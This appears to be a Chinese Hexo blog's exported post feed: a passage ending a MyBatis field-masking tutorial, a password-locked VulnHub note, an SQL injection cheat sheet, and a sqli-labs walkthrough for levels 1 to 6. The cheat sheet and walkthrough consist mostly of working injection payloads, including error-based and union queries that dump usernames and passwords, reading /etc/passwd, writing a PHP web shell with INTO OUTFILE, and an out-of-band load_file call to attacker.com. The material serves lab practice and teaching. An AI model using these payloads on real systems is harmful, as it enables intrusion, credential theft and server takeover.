class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(rs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(CallableStatement cs, <span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(cs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">desensitize</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果字段中存在指定的关键字，则对关键字后面10位字符串使用***代替</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> PATTERN.matcher(value);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> matcher.start() + matcher.group().length();</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(start + <span class="number">10</span>, result.length());</span><br><span class="line">            result.replace(start + offset, end + offset, <span class="string">&quot;***&quot;</span>);</span><br><span class="line">            offset += <span class="string">&quot;***&quot;</span>.length() - (end - start);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回脱敏后的数据</span></span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中：</p>
<ul>
<li>KEYWORD_PATTERN 定义了一个包含多个关键字的正则表达式模式，关键字之间用 | 分隔。</li>
<li>desensitize 方法中，通过 Pattern 和 Matcher 来查找字符串中所有匹配关键字的位置。</li>
<li>使用 StringBuilder 来修改原始字符串，将关键字后的 10 位字符串替换为 ***。在替换过程中，考虑到替换字符串长度变化对后续位置的影响，通过 offset 变量进行修正</li>
</ul>
<h4 id="在Mapper-XML中使用"><a href="#在Mapper-XML中使用" class="headerlink" title="在Mapper XML中使用"></a>在Mapper XML中使用</h4><p> 示例中对请求头req_headers、响应体resp_body字段应用脱敏处理器<br> <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">     <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.example.demo.entity.Log&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;url&quot;</span> <span class="attr">property</span>=<span class="string">&quot;url&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;req_headers&quot;</span> <span class="attr">property</span>=<span class="string">&quot;reqHeaders&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">typeHandler</span>=<span class="string">&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;resp_headers&quot;</span> <span class="attr">property</span>=<span class="string">&quot;respHeaders&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;resp_body&quot;</span> <span class="attr">property</span>=<span class="string">&quot;respBody&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">typeHandler</span>=<span class="string">&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;cost_time&quot;</span> <span class="attr">property</span>=<span class="string">&quot;costTime&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUser&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;BaseResultMap&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, url,</span><br><span class="line">           req_headers,</span><br><span class="line">           resp_headers,</span><br><span class="line">           resp_body,</span><br><span class="line">           cost_time</span><br><span class="line">    FROM logs</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Java后端框架</category>
      </categories>
      <tags>
        <tag>Mybatis框架</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机笔记</title>
    <url>/cnblogs.github.io/2025/01/23/hacker/infiltrate/note/VulnHub%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="03541b2153404ebfd51c5174176f7ce723587b49957cbec8f1e42be173236e8f">3186c319156b07c01cb1ef89dd22490e485ebd5e770f3a816864e4205647f178ccba29da66332efc9fe8dbba1908c081adfa8b5698e3d5fc2f08dfb92667a6d75712092a9011cfce2170d788d39701577830feb167d9993ff9551d4b40b656245bd2cce5f0e9ac3fc91c5f13ebb6d7b5f34500bc56fb09caad31361f423af2e883172c700f2fe17b01c94b5964a9b30a4c2b4056ce182f6529f0a8b4856fa83947391b688fa7df1bf2d4c3b66f12916e19cc5c7833b660881c794ce26eb408ea8aa3b535a034c3b461c5ab128c53d13252ab0e0850d44ff4ac5e75be96a9d8c2323c6ed42e55160c9a1a13d7ad04d31af2c9d40fce715ce6dfc479a8b53b6aa519b1a9ac7391c50d73ad0ca3f435154cbae8ea5e2fa529cd2f7ba314edad6ef3aeee6e821b05c2bb8399d3d7e1c854194f38e517d51b070ba8e3763a958c280fb1fc179ce7de9899ef0461054756fcd97626251fca9afa9cc8499a55fb757a667cf04c096573f7c5d1c73c3bfdd85ec725525a5c647fd11e18a407a1a641fc936586685f1eb0898051dc6e95bcbbae972ae99a37e24d2de9c4ac536e8689bc1d7db784c5c81ba2c0cbfb9b7fd8b46c8088790885534a44edd202749ba23a434c355c41967b0b01c30d39de42a06e53d1d02e9874e9d18cc04d3983d9e6d235f0854cdefa383acfed5727953f249692cb5147250a7088ead7756d3142ef59e945c107ad7a5f0960760732402fbf11df6446a65cb4811b6b579549969d932f70644d5d7215bd5c8c7118ffeb1e944fd79d3e3bd27e2b9d6950a30aca2a586ea5bd1e5ff9b5091d5f8fe6f586a7e717de3b59c7b037ee145a8f58776712c7d1712ebe9dd5d980064720a97b108d497b19beefb7387dad4a9467016d5e306a52a07b465ab5bc9ac7bf1276eba8ecda193c0d331a6b32aa69efa19f9704843a47b2a9ff4df409668a425e23fc164be4b2f8c9b18d5378278bbd413db65ccb76220d55249a0fcb2180cdabb20ad0b5857521b5bc54da89fca0a0cb254846d4a594dfbc7182165c05a2c9b9bda73212c83cbc2ca96c027cdd9d1f5f21654f7e5d5330216e2dc6ef11b1a2aba6c686697a89bcc0abce2c8e0d7430bbe1b7032b2cb76861387c6df4cd4d7507bf25a5672a23a09c9ce8ce9a9ae46e6ba697f2a99051e749e2aea5d2826bbf59fd1c50002934355fce43a3883d9f12e98a3021197423b528fd042451cebcd3e3531c183ed670e4ec7c3e7922042442d2deb8aa5591b2c3f8148148850f72f1ef06e342a12b5dfaeeea599a9793cd8b8b89b3930bc59e0dcef55a6b2fffed3ecd7848844310a5937e79bd0fafbf958ec5b52f289ffa3f50f87c301189056bc4e119d8640310c77e43c1da56c9ffbabc19987d57f23420c7e3076a932cb2b22f6968e2a7d7ffcd80d2bdf904f1834c462e9a50d1a993a7668c79dd8eab6784a2e467af4105e6b778a4776b8041a80b50f3dfe248d5c90e0e96eacdefa6e222693f029e456edf754e5cd8bf9a84fd587573292cb24f0586bc9f400ff3d447f84d6a6eeafa1cb3956d11d8d0aed86b791657d66bd3ebb093eec1c70a4f3ce81b45235cab5de9542c1ded7707a44b942c199bc3fdb5277f6673d50d62b56ea36fb85ff583d712a62f605d55777ab0c7c6a45a42d55028239e5b61f0698731a862743eee8f26af0eae30adc0ef6fcc6270e4b6c7c207bed27602e0ac255eea2a1db2036d1405eacee3ec6cf9747c41f3ef2e84cc10b65a90a20eb49b3593c9df079b58862ad637b49fccb99418011a8cf1a87cb006ca9085c15f6d624a6b78ae9e9966cc747ed65eb6d695cbf0c107d25f98d810c1726dfdded2204ae5d60f2d903b92d60de8a3aa87ebb3b8868ed17ee1fb3957cfe643e616990ebb744b9c8d803937bbc3394c65213d221e84e8acf5041b38469293626f3fc320c343870fce50f6e754b94b491c7317feef6eab93f9a4051db841f848d00c6bb224285311d7576e2d895227364ae9a7941b71b8f7c482b7dafa2b2feea68ac779925adcf2472d5a592d4f7d21f67f7ae993fbcb80e29fe6579fc42d138df5b89f31371175455ad8bc906155a4989c95a76bd561196d6b52723cd3833344e50e66b4e2e81c47385401749298e437c8422567e33d72ba52ca35be0abe65494b8a41c26d227a2cec033e94548bc4812ef3331e26ed211300e219c3d45e62dd60b8f6a4979345fd9531db6c62a72df8bc69b8cea03c85617e00fd7d43acd1f7881d9d749c2ee9e719172b55abe65c8f40542bed70e2f74e8b1f27de39da955883ae13c035b16077c3d4d18d72e627459817a005a5e59c5994f676fdecf52cc61deb5a73f626f7599730c1c1b82d6588893024f5b3121858165342d09a236dc2c6f8a170428c291ba3dd8529848551da05729ea2629cd918bcee1ebf25eee58102ebf1f56534d589e6a82880d2cb4d50647d2dce824c571d37a1541e023891d621e55c96edc197d0fad0b2fa169737eec9ccd14ab1d10b43c5df00db4b198613d77ba4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码输入框上描述性内容</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/cnblogs.github.io/lib/hbe.js"></script><link href="/cnblogs.github.io/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>WEB漏洞挖掘笔记</category>
      </categories>
      <tags>
        <tag>渗透笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB漏洞挖掘方法 - SQL注入篇</title>
    <url>/cnblogs.github.io/2025/01/04/hacker/infiltrate/shares/WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
    <content><![CDATA[<p><strong>常见的注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET/POST/PUT/DELETE参数：常见的注入点，通常会尝试在HTTP请求的参数中注入SQL命令。</span><br><span class="line">如：http://xx.com/product.php?id=12&#x27; OR 1=1 --</span><br><span class="line">X-Forwarded-For：HTTP头部字段，通常用于伪造IP地址，但也可以用于注入SQL或XSS。</span><br><span class="line">如：X-Forwarded-For: 192.168.1.1&#x27; OR 1=1 --</span><br><span class="line">文件名：尝试通过文件上传或者文件路径访问时进行注入。</span><br></pre></td></tr></table></figure>

<p><strong>判断注入点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12/(在这里添加判断)</span><br><span class="line"></span><br><span class="line">&#x27;：单引号，常见于字符串插入的地方，尤其是SQL注入。</span><br><span class="line">/：斜杠，可能用于路径遍历、注入等。</span><br><span class="line">&quot;：双引号，常用于字符串拼接。</span><br><span class="line">1/1：常用于测试SQL注入的效果，1/1返回真。</span><br><span class="line">1/0：常用于测试除零错误，触发数据库报错。</span><br><span class="line">and 1=1：常见的SQL注入测试条件，通常返回真，确认注入是否成功。</span><br><span class="line">&quot; and &quot;1&quot;=&quot;1：类似于</span><br><span class="line">and 1=1，用于测试注入成功与否。</span><br><span class="line">and 1=2：尝试返回假的条件（例如，1=2为假），验证是否会导致不同的行为。</span><br><span class="line">or 1=1：另一种常用的条件判断，若数据库返回成功则说明注入可行。</span><br><span class="line">or 1=：同样是一个条件，可能会触发SQL查询错误。</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1：注入测试，验证条件是否返回真。</span><br><span class="line">+：加号可能用于URL编码或者SQL中拼接字符串。</span><br><span class="line">-：减号，用于注释掉SQL中的后续部分。</span><br><span class="line">^：异或运算符，有时用于绕过过滤或触发错误。</span><br><span class="line">*：星号，可能用于选择所有字段，或作为乘法运算符。</span><br><span class="line">%：百分号，可能用于SQL模糊匹配或URL编码。</span><br><span class="line">/：除号，常用来触发除零错误等SQL注入。</span><br><span class="line">&lt;&lt;, &gt;&gt;：左移右移位操作符，可能用于绕过过滤或触发错误。</span><br><span class="line">||：逻辑或操作符，用于组合多个条件。</span><br><span class="line">|：按位或操作符，可能用于SQL注入或绕过过滤。</span><br><span class="line">&amp;：按位与操作符，常用于某些SQL注入攻击。</span><br><span class="line">&amp;&amp;：逻辑与操作符，组合条件判断。</span><br><span class="line">~：按位取反操作符，有时用于SQL注入。</span><br><span class="line">!：逻辑非操作符，常用于条件判断。</span><br><span class="line">@：在某些数据库中用作变量前缀，或用于其他目的。</span><br></pre></td></tr></table></figure>

<p><strong>注入分类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经典SQL注入：在输入字段中注入恶意的SQL查询语句，例如：&#x27; OR 1=1 --，绕过身份验证，返回所有记录。</span><br><span class="line">盲注（Blind SQL Injection）：</span><br><span class="line">布尔盲注：通过观察页面响应是否变化来推测数据库的内容，例如：&#x27; AND 1=1 -- 和 &#x27; AND 1=2 --。</span><br><span class="line">时间盲注：通过观察数据库响应延迟来判断查询的真假，例如：&#x27; AND SLEEP(5) --。</span><br><span class="line">联合查询注入（Union-based SQL Injection）：使用UNION SELECT来合并多个查询，尝试获取数据库中的其他表数据。</span><br><span class="line">报错注入（Error-based SQL Injection）：通过生成SQL错误，泄露数据库结构信息。</span><br></pre></td></tr></table></figure>

<p><strong>Mysql 中常用的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br><span class="line">@@version：SQL查询常见的数据库版本信息。</span><br><span class="line">@@servername：SQL查询数据库服务器名称。</span><br><span class="line">@@language：SQL查询当前数据库语言设置。</span><br><span class="line">@@spid：SQL查询当前会话ID（进程ID）。</span><br></pre></td></tr></table></figure>

<p><strong>测试列数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如 </span><br><span class="line">http://xx.com/index.asp?id=12+union+select+null,null-- ，不断增加 </span><br><span class="line">null 至不返回</span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and select 1/0：用来触发除零错误，从而可以获取数据库错误信息，帮助推测数据库类型。</span><br><span class="line">http://xx.com/product.php?id=12 and *select 1 from (select count(*), concat(version(), floor(rand(0)2))x from information_schema.tables group by x)a：通过查询数据库信息并触发错误来暴露数据库版本信息。</span><br><span class="line">http://xx.com/product.php?id=12 and extractvalue(1, concat(0x5c, (select user())))：利用XML函数extractvalue来注入并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and updatexml(0x3a, concat(1, (select user())), 1)：类似于extractvalue，用于从XML中提取数据。</span><br><span class="line">http://xx.com/product.php?id=12 and exp(~(SELECT * from(select user())a))：通过调用exp函数触发错误并获取数据库用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and ST_LatFromGeoHash((select * from(select * from(select user())a)b))：利用空间数据函数进行注入。</span><br></pre></td></tr></table></figure>

<p><strong>基于geometric的报错注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and GeometryCollection((select * from(select * from(select user())a)b))：触发错误信息并通过几何类型函数获取用户信息。</span><br><span class="line">http://xx.com/product.php?id=12 and polygon((select * from(select * from(select user())a)b))：同样触发错误，通过polygon函数。</span><br><span class="line">http://xx.com/product.php?id=12 and multipoint((select * from(select * from(select user())a)b))：几何类型函数的一种。</span><br><span class="line">http://xx.com/product.php?id=12 and multilinestring((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and LINESTRING((select * from(select * from(select user())a)b))：几何类型函数之一，用于注入。</span><br><span class="line">http://xx.com/product.php?id=12 and multipolygon((select * from(select * from(select user())a)b))：几何类型函数，用于注入。</span><br></pre></td></tr></table></figure>

<p>其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效而以上列表中基于geometric的报错注入在这个 commit 5caea4 中被修复，在5.5.x较后的版本中同样不再生效</p>
<p><strong>堆叠注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xx.com/product.php?id=12 and ;select 1：使用分号（;）来结束当前查询并开始新的查询。</span><br></pre></td></tr></table></figure>

<p><strong>注释符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：http://xx.com/product.php?id=12#</span><br><span class="line">#：注释符，SQL中用来注释掉后续的语句。</span><br><span class="line">--+：SQL注释符，</span><br><span class="line">--用于注释，</span><br><span class="line">+可绕过某些过滤器。</span><br><span class="line">/xxx/：块注释，SQL注释的一种形式。</span><br><span class="line">/!xxx/：条件注释，仅在特定版本的MySQL中生效，通常用于版本差异化操作。</span><br><span class="line">/!50000xxx/：MySQL特定版本支持的注释格式，通常用于绕过过滤。</span><br></pre></td></tr></table></figure>

<p><strong>判断过滤规则</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">是否有trunc：检查是否存在截断字符。</span><br><span class="line">是否过滤某个字符：检查是否有过滤掉特定字符，如单引号、双引号等。</span><br><span class="line">是否过滤关键字：检查是否有过滤掉SQL关键字，如select, union, insert等。</span><br><span class="line">slash和编码：检查是否需要对斜杠或字符进行编码或转义。</span><br></pre></td></tr></table></figure>

<p><strong>获取信息</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断数据库类型</span><br><span class="line">and exists(select * from msysobjects) &gt; 0：针对Access数据库。</span><br><span class="line">and exists(select * from sysobjects) &gt; 0：针对SQL Server数据库。</span><br><span class="line">判断数据库表</span><br><span class="line">and exists (select * from admin)：检查是否存在admin表，用来验证表名。</span><br><span class="line">确定字段数</span><br><span class="line">Order By：常用于通过排序获取不同字段数目，帮助注入者确认表的列数。</span><br></pre></td></tr></table></figure>

<p><strong>测试权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读敏感文件：测试是否能够读取敏感文件，如/etc/passwd（类Unix系统）、Windows系统中的boot.ini等。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;/etc/passwd&#x27;) --</span><br><span class="line"></span><br><span class="line">写shell：测试是否能够上传并执行恶意脚本（shell）。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; --</span><br><span class="line"></span><br><span class="line">文件操作：测试是否能够对文件进行修改或删除操作。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT &quot;&lt;?php echo &#x27;Hello&#x27;; ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/hello.php&#x27; --</span><br></pre></td></tr></table></figure>

<p><strong>网络请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带外通道：使用HTTP请求、DNS请求、SMTP等协议发送数据，从而建立与攻击者的通信通道。</span><br><span class="line">http://xx.com/product.php?id=12&#x27; UNION SELECT load_file(&#x27;http://attacker.com/shell.txt&#x27;) --</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WEB漏洞挖掘笔记</category>
      </categories>
      <tags>
        <tag>SQL注入篇</tag>
      </tags>
  </entry>
  <entry>
    <title>本地靶场 - sqli-labs通关秘籍</title>
    <url>/cnblogs.github.io/2025/01/04/hacker/local/range/sqli-labs/sqli-labs%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-1</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断sql语句是否是拼接，且是字符型还是数字型。</span><br><span class="line">?id=1  正确</span><br><span class="line">?id=1&#x27; 错误</span><br><span class="line"></span><br><span class="line">?id=1&#x27;--+</span><br><span class="line">?id=1&#x27;order by 3 --+</span><br><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-2</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 3</span><br><span class="line">?id=-1 union select 1,2,3</span><br><span class="line">?id=-1 union select 1,database(),version()</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span><br></pre></td></tr></table></figure>

<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在输入?id=2&#x27;的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号，所以我们需要闭合单引号且也要考虑括号</span><br><span class="line">?id=2&#x27;)--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27;) order by 3--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-4</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">页面报错信息得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入</span><br><span class="line">?id=1&quot;)--+</span><br><span class="line"></span><br><span class="line">?id=1&quot;) order by 3--+</span><br><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-5</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第六关和第五关是差不多的，根据页面报错信息可以猜测id参数是双引号，只需将第五关的单引号换成双引号就可以了。</span><br><span class="line"></span><br><span class="line">获取当前数据库名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">获取当前数据库所有表名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">获取当前数据库user表所有列名称</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),1,31),0x7e),1)--+</span><br><span class="line">#获取当前数据库user表所有username和password的值</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),32,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),63,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),94,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),125,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),156,31),0x7e),1)--+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),187,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>

